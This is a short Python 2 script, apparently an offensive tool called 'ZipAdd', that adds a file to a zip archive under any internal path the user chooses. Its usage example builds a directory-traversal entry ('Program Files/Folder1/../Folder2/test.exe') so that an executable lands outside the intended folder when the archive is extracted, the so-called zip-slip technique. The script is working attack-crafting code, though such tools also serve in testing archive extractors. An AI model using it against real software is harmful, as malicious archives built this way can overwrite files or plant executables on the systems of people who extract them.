#!/usr/bin/python
import zipfile
import sys
import time

def add_file(mode, zipfilename, file, path):
        myzip = zipfile.ZipFile(zipfilename, mode)
        myzip.writestr(path, file.read())
        myzip.close()

def run():
        print "[*] ZipAdd by Meatballs"

        if len(sys.argv) != 4:
                print "[*] Usage: %s ZIP FILE PATH" % sys.argv[0]
                print "[*] %s out.zip test.exe \"Program Files/Folder1/../Folder2/test.exe\"" % sys.argv[0]
                exit()
                
        myzipfile = sys.argv[1]
        myfile = sys.argv[2]
        path = sys.argv[3]

        zi = zipfile.ZipInfo()
        zi.filename = path 
        zi.date_time = time.time()

        try:
                with open(myfile) as inputfile:
                        try:
                                with open(myzipfile) as f:
                                        f.close()
                                        print "[*] Appending '%s' to '%s' as '%s'" % (myfile, myzipfile, path)
                                        add_file('a', myzipfile, inputfile, path)
                
                        except IOError as e:
                                print "[*] Creating new zipfile '%s'" % myzipfile
                                print "[*] Appending '%s' to '%s' as '%s'" % (myfile, myzipfile, path)
                                add_file('w', myzipfile, inputfile, path)
                                
        except IOError as e:
                print e

if __name__ == "__main__":
        run()
